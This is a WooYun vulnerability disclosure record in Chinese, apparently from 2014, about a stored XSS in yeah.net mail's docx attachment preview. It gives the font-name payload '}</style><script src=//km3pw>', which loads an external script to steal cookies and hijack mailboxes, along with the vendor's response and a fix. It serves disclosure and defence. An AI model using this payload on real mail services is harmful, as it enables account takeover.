{"id": 46895, "wybug_id": "wooyun-2014-088918", "wybug_title": "yeah.net邮箱存储型XSS可劫持他人账号", "wybug_corp": "网易", "wybug_author": "0x_Jin", "wybug_date": "2014-12-27 20:34", "wybug_open_date": "2015-02-10 20:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向公众公开  简要描述： 太久不挖xss 手法都生疏了 思路也没以前那么YD了～ 详细说明：  首先问题出在附件预览那(现在邮箱正文的过滤都过滤的差不多了)，附件预览那如果预览doc docx这种类型的文件 便会采用微软的在线预览技术(高清版)以及永中软件的预览技术(极速版)而微软的在线预览技术采用的是将内容嵌入到图片 然后来渲染出一张图片给用户看，这样是比较需要时间以及带宽来加载的(难怪叫高清版)但是永中软件的就相对正常一些了，是获得内容然后渲染到html，这样速度比较快，带宽也无需太多 就跟浏览网页一样。那么现在问题来了，微软的在线预览技术应该做的比较成熟了 所以直接放弃，那另外一个呢？发送一个docx 然后预览发现字体是会输出在style标签中的。\n\n如果在字体中带上恶意payload呢？其实是会过滤的，如果直接闭合style标签会变成这样：</style><script> --->\\60;/style\\62;\\60;script\\62;把payload当成值给编码了，这样就过不去了么，No 好玩的来了。我们只需要有一个 ; 号 来结束掉 font-family 就ok了。那么便可以这样：}</style><script> 这样的话 } 会编码成font-family:\\125;这样我们就有了个;号 然后便可以写payload了最终payload如下 (由于字数问题 分成了两段):}</style><script src=//km3pw>}</script>把上面的两段设置到word文档中的字体里就好了比如 1.xsss --> 字体等于}</style><script src=//km3pw>        2.csrf  --> 字体等于}</script>\n\n\n\n然后发送给别人预览：\n\n\n\n得到cookie后 发现一部分cookie虽然存在httponly属性 导致获取不到cookie。但是还是能拿着得到的cookie登陆上对方的邮箱。   漏洞证明：  \n\n\n\n   修复方案：  不要太依靠第三方的东西 过滤危险字符吧 关键cookie字段设置httponly吧   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-12-30 12:17 厂商回复： 感谢您对网易的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-27 20:37 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  撸主不是YD的人，但是YD起来不是人    \n     2014-12-27 20:52 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  撸主一般不YD，但是YD起来不是人    \n     2014-12-29 10:28 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。还真的3个都发了一遍，我想说网易这3个邮箱不是都是一套系统和一套过滤器么    \n     2014-12-31 10:53 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  别中招,挖洞不易，且行且珍惜    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}